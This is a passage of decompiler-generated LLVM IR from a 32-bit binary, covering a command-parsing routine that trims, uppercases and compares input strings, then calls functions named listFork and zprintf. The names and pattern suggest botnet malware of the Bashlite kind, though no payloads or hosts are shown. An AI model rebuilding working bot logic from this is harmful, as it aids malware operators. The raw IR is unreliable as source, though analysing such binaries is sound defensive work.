  %v0_804d038 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804d03d = load i32, i32* @global_var_80584cc.32, align 4
  %v1_804d043 = add i32 %v0_804d038, -1
  %v4_804d043 = icmp ne i32 %v0_804d038, 0
  %v2_804d046 = zext i1 %v4_804d043 to i32
  %v3_804d046 = add i32 %v0_804d03d, -1
  %v4_804d046 = add i32 %v3_804d046, %v2_804d046
  store i32 %v1_804d043, i32* @global_var_80584c8.31, align 8
  store i32 %v4_804d046, i32* @global_var_80584cc.32, align 4
  %v3_804d05f = mul i32 %v4_804d046, 4
  %v4_804d05f = udiv i32 %v1_804d043, 1073741824
  %v5_804d05f = or i32 %v3_804d05f, %v4_804d05f
  store i32 %v5_804d05f, i32* %edx.global-to-local, align 4
  %v2_804d063 = mul i32 %v1_804d043, 4
  %v1_804d066 = add i32 %v2_804d063, 4
  store i32 %v1_804d066, i32* %eax.global-to-local, align 4
  %v0_804d069 = load i32, i32* @esp, align 4
  %v5_804d069 = icmp ult i32 %v0_804d069, 12
  store i1 %v5_804d069, i1* %cf.global-to-local, align 1
  %v2_804d06c = add i32 %v0_804d069, -16
  %v3_804d06c = inttoptr i32 %v2_804d06c to i32*
  store i32 %v1_804d066, i32* %v3_804d06c, align 4
  %v1_804d06d = call i32 @malloc(i32 0)
  store i32 %v1_804d06d, i32* %eax.global-to-local, align 4
  %v0_804d072 = load i32, i32* @esp, align 4
  %v2_804d072 = icmp ugt i32 %v0_804d072, -17
  store i1 %v2_804d072, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d0a3

dec_label_pc_804d081:                             ; preds = %dec_label_pc_804d0a3, %dec_label_pc_804d0dd
  %v2_804d084 = mul i32 %storemerge18, 4
  %v5_804d089 = add i32 %v2_804d084, %v1_804d06d
  store i32 %v2_804d084, i32* %edx.global-to-local, align 4
  %v0_804d094 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d099 = add i32 %v0_804d094, %v2_804d084
  store i32 %v2_804d099, i32* %eax.global-to-local, align 4
  %v1_804d09c = inttoptr i32 %v2_804d099 to i32*
  %v2_804d09c = load i32, i32* %v1_804d09c, align 4
  store i32 %v2_804d09c, i32* %eax.global-to-local, align 4
  %v2_804d09e = inttoptr i32 %v5_804d089 to i32*
  store i32 %v2_804d09c, i32* %v2_804d09e, align 4
  %v4_804d0a0 = add i32 %storemerge18, 1
  br label %dec_label_pc_804d0a3

dec_label_pc_804d0a3:                             ; preds = %dec_label_pc_804d01f, %dec_label_pc_804d081
  %storemerge18 = phi i32 [ %v4_804d0a0, %dec_label_pc_804d081 ], [ 0, %dec_label_pc_804d01f ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_804d0b7 = load i32, i32* @global_var_80584c8.31, align 8
  store i32 %v0_804d0b7, i32* %edx.global-to-local, align 4
  %v0_804d0bd = load i32, i32* @global_var_80584cc.32, align 4
  %v10_804d0d5 = icmp eq i32 %v0_804d0bd, 0
  br i1 %v10_804d0d5, label %dec_label_pc_804d0dd, label %dec_label_pc_804d081

dec_label_pc_804d0dd:                             ; preds = %dec_label_pc_804d0a3
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d0b7, i32* @edi, align 4
  %v10_804d0f1 = icmp ult i32 %storemerge18, %v0_804d0b7
  br i1 %v10_804d0f1, label %dec_label_pc_804d081, label %dec_label_pc_804d0f9

dec_label_pc_804d0f9:                             ; preds = %dec_label_pc_804d0dd
  %v0_804d0f9 = load i32, i32* @global_var_805e754.33, align 4
  store i32 %v0_804d0f9, i32* %eax.global-to-local, align 4
  %v0_804d0fe = load i32, i32* @esp, align 4
  %v5_804d0fe = icmp ult i32 %v0_804d0fe, 12
  store i1 %v5_804d0fe, i1* %cf.global-to-local, align 1
  %v2_804d101 = add i32 %v0_804d0fe, -16
  %v3_804d101 = inttoptr i32 %v2_804d101 to i32*
  store i32 %v0_804d0f9, i32* %v3_804d101, align 4
  %v1_804d102 = call i32 @free(i32 0)
  %v0_804d107 = load i32, i32* @esp, align 4
  %v2_804d107 = icmp ugt i32 %v0_804d107, -17
  store i1 %v2_804d107, i1* %cf.global-to-local, align 1
  store i32 %v1_804d06d, i32* %eax.global-to-local, align 4
  store i32 %v1_804d06d, i32* @global_var_805e754.33, align 4
  br label %dec_label_pc_804d112

dec_label_pc_804d112:                             ; preds = %dec_label_pc_804cf6c, %dec_label_pc_804d0f9
  %v0_804cf7e104.in = phi i32 [ %v0_804d107, %dec_label_pc_804d0f9 ], [ %v0_804cf8b, %dec_label_pc_804cf6c ]
  %stack_var_-60.1 = phi i32 [ %v1_804d06d, %dec_label_pc_804d0f9 ], [ %stack_var_-60.2, %dec_label_pc_804cf6c ]
  br label %dec_label_pc_804d115

dec_label_pc_804d115:                             ; preds = %dec_label_pc_804d58a, %dec_label_pc_804d112
  %v0_804cf7e.in = phi i32 [ %v0_804cf7e104.in, %dec_label_pc_804d112 ], [ %v0_804d5a5, %dec_label_pc_804d58a ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_804d112 ], [ %stack_var_-60.3, %dec_label_pc_804d58a ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_804d112 ], [ 0, %dec_label_pc_804d58a ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_804d120 = ashr i32 %storemerge17, 31
  store i32 %v2_804d120, i32* %edx.global-to-local, align 4
  %v0_804d129 = load i32, i32* @global_var_80584c8.31, align 8
  store i32 %v0_804d129, i32* @esi, align 4
  %v0_804d12f = load i32, i32* @global_var_80584cc.32, align 4
  store i32 %v0_804d12f, i32* @edi, align 4
  %v10_804d147 = icmp ult i32 %v2_804d120, %v0_804d12f
  store i1 %v10_804d147, i1* %cf.global-to-local, align 1
  br i1 %v10_804d147, label %dec_label_pc_804cf6c, label %dec_label_pc_804d153

dec_label_pc_804d153:                             ; preds = %dec_label_pc_804d115
  store i32 %v0_804d12f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d15f = icmp ugt i32 %v2_804d120, %v0_804d12f
  br i1 %v6_804d15f, label %dec_label_pc_804d173, label %dec_label_pc_804d161

dec_label_pc_804d161:                             ; preds = %dec_label_pc_804d153
  store i32 %v0_804d129, i32* %edx.global-to-local, align 4
  %v10_804d167 = icmp ult i32 %storemerge17, %v0_804d129
  store i1 %v10_804d167, i1* %cf.global-to-local, align 1
  br i1 %v10_804d167, label %dec_label_pc_804cf6c, label %dec_label_pc_804d173

dec_label_pc_804d173:                             ; preds = %dec_label_pc_804d161, %dec_label_pc_804d153
  %v0_804d176 = load i32, i32* @ebp, align 4
  %v2_804d176 = add i32 %v0_804d5a0, -5736
  %v3_804d176 = add i32 %v2_804d176, %v0_804d176
  %v4_804d176 = inttoptr i32 %v3_804d176 to i8*
  store i8 0, i8* %v4_804d176, align 1
  %v0_804d17e = load i32, i32* @esp, align 4
  %v5_804d17e = icmp ult i32 %v0_804d17e, 12
  store i1 %v5_804d17e, i1* %cf.global-to-local, align 1
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v2_804d187 = add i32 %v0_804d17e, -16
  %v3_804d187 = inttoptr i32 %v2_804d187 to i32*
  store i32 %v2_804d58a, i32* %v3_804d187, align 4
  %v0_804d188 = call i32 @trim()
  %v0_804d18d = load i32, i32* @esp, align 4
  %tmp279 = and i32 %v0_804d18d, -8
  %v5_804d190 = icmp eq i32 %tmp279, -16
  store i1 %v5_804d190, i1* %cf.global-to-local, align 1
  %v1_804d193 = add i32 %v0_804d18d, 4
  %v2_804d193 = inttoptr i32 %v1_804d193 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055a6a.146 to i32), i32* %v2_804d193, align 4
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v3_804d19e = inttoptr i32 %v0_804d18d to i32*
  store i32 %v2_804d58a, i32* %v3_804d19e, align 4
  %v3_804d19f = call i32 @strstr(i32 %v0_804d12f, i8* bitcast (i32* @0 to i8*))
  %v0_804d1a4 = load i32, i32* @esp, align 4
  %v1_804d1a4 = add i32 %v0_804d1a4, 16
  store i32 %v3_804d19f, i32* %edx.global-to-local, align 4
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v7_804d1af = icmp ult i32 %v3_804d19f, %v2_804d58a
  store i1 %v7_804d1af, i1* %cf.global-to-local, align 1
  %v12_804d1af = icmp eq i32 %v3_804d19f, %v2_804d58a
  br i1 %v12_804d1af, label %dec_label_pc_804d58a, label %dec_label_pc_804d1b7

dec_label_pc_804d1b7:                             ; preds = %dec_label_pc_804d173
  %v5_804d1b7 = icmp ult i32 %v1_804d1a4, 8
  store i1 %v5_804d1b7, i1* %cf.global-to-local, align 1
  %v1_804d1ba = add i32 %v0_804d1a4, 4
  %v2_804d1ba = inttoptr i32 %v1_804d1ba to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8055b8a.173 to i32), i32* %v2_804d1ba, align 4
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v3_804d1c5 = inttoptr i32 %v0_804d1a4 to i32*
  store i32 %v2_804d58a, i32* %v3_804d1c5, align 4
  %v3_804d1c6 = call i32 @strstr(i32 %v0_804d12f, i8* bitcast (i32* @0 to i8*))
  %v0_804d1cb = load i32, i32* @esp, align 4
  store i32 %v3_804d1c6, i32* @edx, align 4
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v7_804d1d6 = icmp ult i32 %v3_804d1c6, %v2_804d58a
  store i1 %v7_804d1d6, i1* %cf.global-to-local, align 1
  %v12_804d1d6 = icmp eq i32 %v3_804d1c6, %v2_804d58a
  %v1_804d1d8 = icmp eq i1 %v12_804d1d6, false
  br i1 %v1_804d1d8, label %dec_label_pc_804d202, label %dec_label_pc_804d1da

dec_label_pc_804d1da:                             ; preds = %dec_label_pc_804d1b7
  %v1_804d1cb = add i32 %v0_804d1cb, 16
  %v4_804d1da = add i32 %stack_var_-96.2.ph34, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8055b93.174 to i32), i32* %eax.global-to-local, align 4
  %v5_804d1e2 = icmp ult i32 %v1_804d1cb, 12
  store i1 %v5_804d1e2, i1* %cf.global-to-local, align 1
  %v3_804d1e5 = inttoptr i32 %v0_804d1cb to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8055b93.174 to i32), i32* %v3_804d1e5, align 4
  %v1_804d1e6 = call i32 @zprintf(i32 %v4_804d1da)
  store i32 %v1_804d1e6, i32* @eax, align 4
  %v0_804d1eb = load i32, i32* @esp, align 4
  %v9_804d1ee = icmp ult i32 %v4_804d1da, 20
  store i1 %v9_804d1ee, i1* %cf.global-to-local, align 1
  %v7_804d1f2 = icmp sgt i32 %v4_804d1da, 20
  br i1 %v7_804d1f2, label %dec_label_pc_804d1f8, label %dec_label_pc_804cf07.outer

dec_label_pc_804d1f8:                             ; preds = %dec_label_pc_804d1da
  %v1_804d1eb = add i32 %v0_804d1eb, 16
  %v5_804d1f8 = icmp ult i32 %v1_804d1eb, 12
  store i1 %v5_804d1f8, i1* %cf.global-to-local, align 1
  %v2_804d1fb = inttoptr i32 %v0_804d1eb to i32*
  store i32 0, i32* %v2_804d1fb, align 4
  %v1_804d1fd = call i32 @__GI_exit(i32 %v4_804d1da)
  store i32 %v1_804d1fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d202

dec_label_pc_804d202:                             ; preds = %dec_label_pc_804d1b7, %dec_label_pc_804d1f8
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph34, %dec_label_pc_804d1b7 ], [ %v4_804d1da, %dec_label_pc_804d1f8 ]
  %v2_804d20e = load i8, i8* %tmp190, align 4
  %v3_804d20e = zext i8 %v2_804d20e to i32
  %v6_804d20e = or i32 %v3_804d20e, %v5_804d20e
  store i32 %v6_804d20e, i32* %eax.global-to-local, align 4
  %v6_804d210 = icmp ult i8 %v2_804d20e, 33
  store i1 %v6_804d210, i1* %cf.global-to-local, align 1
  %v10_804d210 = icmp eq i8 %v2_804d20e, 33
  %v1_804d212 = icmp eq i1 %v10_804d210, false
  br i1 %v1_804d212, label %dec_label_pc_804d58a.outer31, label %dec_label_pc_804d218

dec_label_pc_804d218:                             ; preds = %dec_label_pc_804d202
  store i32 %v1_804d21b, i32* %eax.global-to-local, align 4
  %v2_804d227211 = load i8, i8* %storemerge16210, align 1
  %v3_804d227212 = zext i8 %v2_804d227211 to i32
  %v6_804d227214 = or i32 %v3_804d227212, %v5_804d20e
  store i32 %v6_804d227214, i32* %eax.global-to-local, align 4
  %v3_804d229215 = icmp ult i8 %v2_804d227211, 32
  store i1 %v3_804d229215, i1* %cf.global-to-local, align 1
  %v7_804d229216 = icmp eq i8 %v2_804d227211, 32
  br i1 %v7_804d229216, label %dec_label_pc_804d236, label %dec_label_pc_804d22d

dec_label_pc_804d221:                             ; preds = %dec_label_pc_804d22d
  %v5_804d221 = add i32 %storemerge16.in217, 1
  %storemerge16 = inttoptr i32 %v5_804d221 to i8*
  store i32 %v5_804d221, i32* %eax.global-to-local, align 4
  %v2_804d227 = load i8, i8* %storemerge16, align 1
  %v3_804d227 = zext i8 %v2_804d227 to i32
  %v5_804d227 = and i32 %v5_804d221, -256
  %v6_804d227 = or i32 %v3_804d227, %v5_804d227
  store i32 %v6_804d227, i32* %eax.global-to-local, align 4
  %v3_804d229 = icmp ult i8 %v2_804d227, 32
  store i1 %v3_804d229, i1* %cf.global-to-local, align 1
  %v7_804d229 = icmp eq i8 %v2_804d227, 32
  br i1 %v7_804d229, label %dec_label_pc_804d236, label %dec_label_pc_804d22d

dec_label_pc_804d22d:                             ; preds = %dec_label_pc_804d218, %dec_label_pc_804d221
  %v5_804d227219 = phi i32 [ %v5_804d227, %dec_label_pc_804d221 ], [ %v5_804d20e, %dec_label_pc_804d218 ]
  %storemerge16218 = phi i8* [ %storemerge16, %dec_label_pc_804d221 ], [ %storemerge16210, %dec_label_pc_804d218 ]
  %storemerge16.in217 = phi i32 [ %v5_804d221, %dec_label_pc_804d221 ], [ %v1_804d21b, %dec_label_pc_804d218 ]
  store i32 %storemerge16.in217, i32* %eax.global-to-local, align 4
  %v2_804d230 = load i8, i8* %storemerge16218, align 1
  %v3_804d230 = zext i8 %v2_804d230 to i32
  %v6_804d230 = or i32 %v3_804d230, %v5_804d227219
  store i32 %v6_804d230, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d232 = icmp eq i8 %v2_804d230, 0
  %v1_804d234 = icmp eq i1 %v4_804d232, false
  br i1 %v1_804d234, label %dec_label_pc_804d221, label %dec_label_pc_804d236

dec_label_pc_804d236:                             ; preds = %dec_label_pc_804d221, %dec_label_pc_804d22d, %dec_label_pc_804d218
  %storemerge16.in.lcssa = phi i32 [ %v1_804d21b, %dec_label_pc_804d218 ], [ %storemerge16.in217, %dec_label_pc_804d22d ], [ %v5_804d221, %dec_label_pc_804d221 ]
  %storemerge16.lcssa = phi i8* [ %storemerge16210, %dec_label_pc_804d218 ], [ %storemerge16218, %dec_label_pc_804d22d ], [ %storemerge16, %dec_label_pc_804d221 ]
  %v5_804d227.lcssa = phi i32 [ %v5_804d20e, %dec_label_pc_804d218 ], [ %v5_804d227219, %dec_label_pc_804d22d ], [ %v5_804d227, %dec_label_pc_804d221 ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804d239 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_804d239 = zext i8 %v2_804d239 to i32
  %v6_804d239 = or i32 %v3_804d239, %v5_804d227.lcssa
  store i32 %v6_804d239, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d23b = icmp eq i8 %v2_804d239, 0
  br i1 %v4_804d23b, label %dec_label_pc_804d58a.outer31, label %dec_label_pc_804d243

dec_label_pc_804d243:                             ; preds = %dec_label_pc_804d236
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_804d20e, i32* %eax.global-to-local, align 4
  %v3_804d267 = call i32 @_strlen(i8* %storemerge16210)
  %v6_804d26e = add i32 %v2_804d58a, %v3_804d267
  %v1_804d271 = add i32 %v6_804d26e, 2
  %v5_804d271 = icmp ugt i32 %v6_804d26e, -3
  store i1 %v5_804d271, i1* %cf.global-to-local, align 1
  store i32 %v1_804d271, i32* %eax.global-to-local, align 4
  %v5_804d274 = inttoptr i32 %v1_804d271 to i8*
  %v1_804d2ac = and i32 %v1_804d271, -256
  br label %dec_label_pc_804d29e

dec_label_pc_804d279:                             ; preds = %dec_label_pc_804d2c6, %dec_label_pc_804d29e
  store i32 %v1_804d2ac, i32* %eax.global-to-local, align 4
  %v3_804d290 = call i32 @_strlen(i8* %v5_804d274)
  %v4_804d290 = mul i32 %v3_804d290, -1
  %v1_804d296 = sub i32 0, %v4_804d290
  %v6_804d297 = sub i32 %v1_804d271, %v4_804d290
  %v11_804d297 = icmp ult i32 %v6_804d297, %v1_804d296
  store i1 %v11_804d297, i1* %cf.global-to-local, align 1
  %v1_804d29a = add i32 %v6_804d297, -1
  store i32 %v1_804d29a, i32* %eax.global-to-local, align 4
  %v1_804d29b = inttoptr i32 %v1_804d29a to i8*
  store i8 0, i8* %v1_804d29b, align 1
  br label %dec_label_pc_804d29e

dec_label_pc_804d29e:                             ; preds = %dec_label_pc_804d243, %dec_label_pc_804d279
  %stack_var_-5832.1 = phi i32 [ %stack_var_-5832.2.ph27, %dec_label_pc_804d243 ], [ %v1_804d271, %dec_label_pc_804d279 ]
  store i32 %v1_804d2ac, i32* %eax.global-to-local, align 4
  %v3_804d2b5 = call i32 @_strlen(i8* %v5_804d274)
  %v4_804d2b5 = mul i32 %v3_804d2b5, -1
  %v1_804d2bb = sub i32 0, %v4_804d2b5
  %v6_804d2bc = sub i32 %v1_804d271, %v4_804d2b5
  %v11_804d2bc = icmp ult i32 %v6_804d2bc, %v1_804d2bb
  store i1 %v11_804d2bc, i1* %cf.global-to-local, align 1
  %v1_804d2bf = add i32 %v6_804d2bc, -1
  store i32 %v1_804d2bf, i32* %eax.global-to-local, align 4
  %v1_804d2c0 = inttoptr i32 %v1_804d2bf to i8*
  %v2_804d2c0 = load i8, i8* %v1_804d2c0, align 1
  %v3_804d2c0 = zext i8 %v2_804d2c0 to i32
  %v5_804d2c0 = and i32 %v1_804d2bf, -256
  %v6_804d2c0 = or i32 %v3_804d2c0, %v5_804d2c0
  store i32 %v6_804d2c0, i32* %eax.global-to-local, align 4
  %v6_804d2c2 = icmp ult i8 %v2_804d2c0, 10
  store i1 %v6_804d2c2, i1* %cf.global-to-local, align 1
  %v10_804d2c2 = icmp eq i8 %v2_804d2c0, 10
  br i1 %v10_804d2c2, label %dec_label_pc_804d279, label %dec_label_pc_804d2c6

dec_label_pc_804d2c6:                             ; preds = %dec_label_pc_804d29e
  store i32 %v1_804d2ac, i32* %eax.global-to-local, align 4
  %v3_804d2dd = call i32 @_strlen(i8* %v5_804d274)
  %v4_804d2dd = mul i32 %v3_804d2dd, -1
  %v1_804d2e3 = sub i32 0, %v4_804d2dd
  %v6_804d2e4 = sub i32 %v1_804d271, %v4_804d2dd
  %v11_804d2e4 = icmp ult i32 %v6_804d2e4, %v1_804d2e3
  store i1 %v11_804d2e4, i1* %cf.global-to-local, align 1
  %v1_804d2e7 = add i32 %v6_804d2e4, -1
  store i32 %v1_804d2e7, i32* %eax.global-to-local, align 4
  %v1_804d2e8 = inttoptr i32 %v1_804d2e7 to i8*
  %v2_804d2e8 = load i8, i8* %v1_804d2e8, align 1
  %v3_804d2e8 = zext i8 %v2_804d2e8 to i32
  %v5_804d2e8 = and i32 %v1_804d2e7, -256
  %v6_804d2e8 = or i32 %v3_804d2e8, %v5_804d2e8
  store i32 %v6_804d2e8, i32* %eax.global-to-local, align 4
  %v6_804d2ea = icmp ult i8 %v2_804d2e8, 13
  store i1 %v6_804d2ea, i1* %cf.global-to-local, align 1
  %v10_804d2ea = icmp eq i8 %v2_804d2e8, 13
  br i1 %v10_804d2ea, label %dec_label_pc_804d279, label %dec_label_pc_804d2ee

dec_label_pc_804d2ee:                             ; preds = %dec_label_pc_804d2c6
  store i32 %v1_804d271, i32* %eax.global-to-local, align 4
  %v2_804d2fc226 = load i8, i8* %v5_804d274, align 1
  %v3_804d2fc227 = zext i8 %v2_804d2fc226 to i32
  %v6_804d2fc229 = or i32 %v3_804d2fc227, %v1_804d2ac
  store i32 %v6_804d2fc229, i32* %eax.global-to-local, align 4
  %v3_804d2fe230 = icmp ult i8 %v2_804d2fc226, 32
  store i1 %v3_804d2fe230, i1* %cf.global-to-local, align 1
  %v7_804d2fe231 = icmp eq i8 %v2_804d2fc226, 32
  br i1 %v7_804d2fe231, label %dec_label_pc_804d30b, label %dec_label_pc_804d302

dec_label_pc_804d2f6:                             ; preds = %dec_label_pc_804d302
  %v5_804d2f6 = add i32 %v4_804d2f9233, 1
  %v22_804d2f6 = inttoptr i32 %v5_804d2f6 to i8*
  store i32 %v5_804d2f6, i32* %eax.global-to-local, align 4
  %v2_804d2fc = load i8, i8* %v22_804d2f6, align 1
  %v3_804d2fc = zext i8 %v2_804d2fc to i32
  %v5_804d2fc = and i32 %v5_804d2f6, -256
  %v6_804d2fc = or i32 %v3_804d2fc, %v5_804d2fc
  store i32 %v6_804d2fc, i32* %eax.global-to-local, align 4
  %v3_804d2fe = icmp ult i8 %v2_804d2fc, 32
  store i1 %v3_804d2fe, i1* %cf.global-to-local, align 1
  %v7_804d2fe = icmp eq i8 %v2_804d2fc, 32
  br i1 %v7_804d2fe, label %dec_label_pc_804d30b, label %dec_label_pc_804d302

dec_label_pc_804d302:                             ; preds = %dec_label_pc_804d2ee, %dec_label_pc_804d2f6
  %v5_804d2fc234 = phi i32 [ %v5_804d2fc, %dec_label_pc_804d2f6 ], [ %v1_804d2ac, %dec_label_pc_804d2ee ]
  %v4_804d2f9233 = phi i32 [ %v5_804d2f6, %dec_label_pc_804d2f6 ], [ %v1_804d271, %dec_label_pc_804d2ee ]
  %stack_var_-64.1232 = phi i8* [ %v22_804d2f6, %dec_label_pc_804d2f6 ], [ %v5_804d274, %dec_label_pc_804d2ee ]
  store i32 %v4_804d2f9233, i32* %eax.global-to-local, align 4
  %v2_804d305 = load i8, i8* %stack_var_-64.1232, align 1
  %v3_804d305 = zext i8 %v2_804d305 to i32
  %v6_804d305 = or i32 %v3_804d305, %v5_804d2fc234
  store i32 %v6_804d305, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d307 = icmp eq i8 %v2_804d305, 0
  %v1_804d309 = icmp eq i1 %v4_804d307, false
  br i1 %v1_804d309, label %dec_label_pc_804d2f6, label %dec_label_pc_804d30b

dec_label_pc_804d30b:                             ; preds = %dec_label_pc_804d2f6, %dec_label_pc_804d302, %dec_label_pc_804d2ee
  %stack_var_-64.1.lcssa = phi i8* [ %v5_804d274, %dec_label_pc_804d2ee ], [ %stack_var_-64.1232, %dec_label_pc_804d302 ], [ %v22_804d2f6, %dec_label_pc_804d2f6 ]
  %v4_804d2f9.lcssa = phi i32 [ %v1_804d271, %dec_label_pc_804d2ee ], [ %v4_804d2f9233, %dec_label_pc_804d302 ], [ %v5_804d2f6, %dec_label_pc_804d2f6 ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_804d311 = add i32 %v4_804d2f9.lcssa, 1
  store i32 %v1_804d271, i32* %eax.global-to-local, align 4
  %v2_804d33f240 = load i8, i8* %v5_804d274, align 1
  %v3_804d33f241 = zext i8 %v2_804d33f240 to i32
  %v6_804d33f243 = or i32 %v3_804d33f241, %v1_804d2ac
  store i32 %v6_804d33f243, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d341244 = icmp eq i8 %v2_804d33f240, 0
  %v1_804d343245 = icmp eq i1 %v4_804d341244, false
  br i1 %v1_804d343245, label %dec_label_pc_804d31c, label %dec_label_pc_804d345

dec_label_pc_804d31c:                             ; preds = %dec_label_pc_804d30b, %dec_label_pc_804d31c
  %storemerge15247 = phi i8* [ %storemerge15, %dec_label_pc_804d31c ], [ %v5_804d274, %dec_label_pc_804d30b ]
  %storemerge15.in246 = phi i32 [ %v5_804d339, %dec_label_pc_804d31c ], [ %v1_804d271, %dec_label_pc_804d30b ]
  store i32 %storemerge15.in246, i32* %eax.global-to-local, align 4
  %v2_804d31f = load i8, i8* %storemerge15247, align 1
  %v3_804d31f = zext i8 %v2_804d31f to i32
  store i32 %v3_804d31f, i32* %eax.global-to-local, align 4
  %v0_804d326 = load i32, i32* @esp, align 4
  %v5_804d326 = icmp ult i32 %v0_804d326, 12
  store i1 %v5_804d326, i1* %cf.global-to-local, align 1
  %v2_804d329 = add i32 %v0_804d326, -16
  %v3_804d329 = inttoptr i32 %v2_804d329 to i32*
  store i32 %v3_804d31f, i32* %v3_804d329, align 4
  %v2_804d32a = call i32 @__GI_toupper(i32 %storemerge15.in246)
  %v0_804d32f = load i32, i32* @esp, align 4
  %v2_804d32f = icmp ugt i32 %v0_804d32f, -17
  store i1 %v2_804d32f, i1* %cf.global-to-local, align 1
  %v1_804d332 = urem i32 %v2_804d32a, 256
  %v2_804d332 = load i32, i32* @edx, align 4
  %v3_804d332 = and i32 %v2_804d332, -256
  %v4_804d332 = or i32 %v3_804d332, %v1_804d332
  store i32 %v4_804d332, i32* @edx, align 4
  %v1_804d337 = trunc i32 %v2_804d32a to i8
  store i8 %v1_804d337, i8* %storemerge15247, align 1
  %v5_804d339 = add i32 %storemerge15.in246, 1
  %storemerge15 = inttoptr i32 %v5_804d339 to i8*
  store i32 %v5_804d339, i32* %eax.global-to-local, align 4
  %v2_804d33f = load i8, i8* %storemerge15, align 1
  %v3_804d33f = zext i8 %v2_804d33f to i32
  %v5_804d33f = and i32 %v5_804d339, -256
  %v6_804d33f = or i32 %v3_804d33f, %v5_804d33f
  store i32 %v6_804d33f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d341 = icmp eq i8 %v2_804d33f, 0
  %v1_804d343 = icmp eq i1 %v4_804d341, false
  br i1 %v1_804d343, label %dec_label_pc_804d31c, label %dec_label_pc_804d345

dec_label_pc_804d345:                             ; preds = %dec_label_pc_804d31c, %dec_label_pc_804d30b
  %v22_804d311 = inttoptr i32 %v5_804d311 to i8*
  store i32 %v1_804d271, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804d271, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8055ba7.175 to i32), i32* @edi, align 4
  %v7_804d375 = call i32 @_strncmp(i8* %v5_804d274, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8055ba7.175, i32 0, i32 0), i32 11)
  %v8_804d375 = urem i32 %v7_804d375, 2
  %v9_804d375 = icmp eq i32 %v8_804d375, 0
  %v0_804d377 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d377 = or i1 %v0_804d377, %v9_804d375
  %v3_804d377 = zext i1 %v2_804d377 to i32
  %v4_804d377 = load i32, i32* @edx, align 4
  %v5_804d377 = and i32 %v4_804d377, -256
  %v6_804d377 = or i32 %v3_804d377, %v5_804d377
  %v7_804d377 = xor i32 %v6_804d377, 1
  store i32 %v7_804d377, i32* @edx, align 4
  %v3_804d37d = and i32 %v7_804d375, -256
  %v1_804d37f = trunc i32 %v7_804d377 to i8
  %v3_804d37f = zext i1 %v0_804d377 to i8
  %v4_804d37f = sub nsw i8 %v1_804d37f, %v3_804d37f
  %v15_804d37f = icmp eq i8 %v4_804d37f, 0
  %v20_804d37f = zext i8 %v4_804d37f to i32
  %v23_804d37f = or i32 %v20_804d37f, %v3_804d37d
  store i32 %v23_804d37f, i32* @ecx, align 4
  %v2_804d383 = sext i8 %v4_804d37f to i32
  store i32 %v2_804d383, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d388 = icmp eq i1 %v15_804d37f, false
  br i1 %v1_804d388, label %dec_label_pc_804d460, label %dec_label_pc_804d38e

dec_label_pc_804d38e:                             ; preds = %dec_label_pc_804d345
  %v0_804d38e = call i32 @listFork()
  store i32 %v0_804d38e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d393 = icmp eq i32 %v0_804d38e, 0
  %v1_804d395 = icmp eq i1 %v1_804d393, false
  br i1 %v1_804d395, label %dec_label_pc_804d58a.outer26, label %dec_label_pc_804d39b

dec_label_pc_804d39b:                             ; preds = %dec_label_pc_804d38e
  store i32 %v2_804d39b, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804d3a8 = load i32, i32* @esp, align 4
  %v5_804d3a8 = icmp ult i32 %v0_804d3a8, 4
  store i1 %v5_804d3a8, i1* %cf.global-to-local, align 1
  %v2_804d3ab = add i32 %v0_804d3a8, -8
  %v3_804d3ab = inttoptr i32 %v2_804d3ab to i32*
  store i32 1024, i32* %v3_804d3ab, align 4
  %v1_804d3ac = add i32 %v0_804d3a8, -12
  %v2_804d3ac = inttoptr i32 %v1_804d3ac to i32*
  store i32 0, i32* %v2_804d3ac, align 4
  %v2_804d3ae = add i32 %v0_804d3a8, -16
  %v3_804d3ae = inttoptr i32 %v2_804d3ae to i32*
  store i32 %v2_804d39b, i32* %v3_804d3ae, align 4
  %v5_804d3af = call i32 @__GI_memset(i8* inttoptr (i32 11 to i8*), i32 ptrtoint ([11 x i8]* @global_var_8055ba7.175 to i32), i32 %v1_804d271)
  %v0_804d3b4 = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8055bb2.176 to i32), i32* %eax.global-to-local, align 4
